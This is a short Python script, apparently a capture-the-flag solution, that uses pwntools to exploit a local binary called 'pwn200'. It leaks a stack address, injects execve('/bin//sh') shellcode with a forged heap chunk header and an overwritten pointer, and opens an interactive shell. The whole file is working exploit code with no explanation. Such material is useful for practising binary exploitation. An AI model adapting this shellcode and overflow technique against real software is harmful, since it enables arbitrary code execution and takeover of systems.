from pwn import *
context(arch='amd64',os='linux')
context.log_level = 'debug'
io = process('./pwn200')
shellcode=""
shellcode += "\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"
io.recvuntil('who are u?\n')
io.send('a'*0x30)
io.recvuntil('a'*0x30)
rbp_addr = u64(io.recv(6).ljust(8,'\x00'))
log.success('rbp : '+hex(rbp_addr))
io.recvuntil('give me your id ~~?\n')
io.sendline('33')
io.recvuntil('give me money~\n')
payload = shellcode +p64(0)*2 + p64(0x41)
payload = payload.ljust(0x38,'\x00')
payload += p64(rbp_addr - 0x90)
io.send(payload)
io.recvuntil('your choice : ')
io.sendline('2')
io.recvuntil('your choice : ')
io.sendline('1')
io.recvuntil('how long?\n')
#gdb.attach(io,'b *0x4008FD')
#raw_input()
io.sendline(str(0x30))
io.recv()
io.sendline(p64(0)*3+p64(rbp_addr - 0xc0 + 1))
io.recv()
io.sendline('3')
io.interactive()
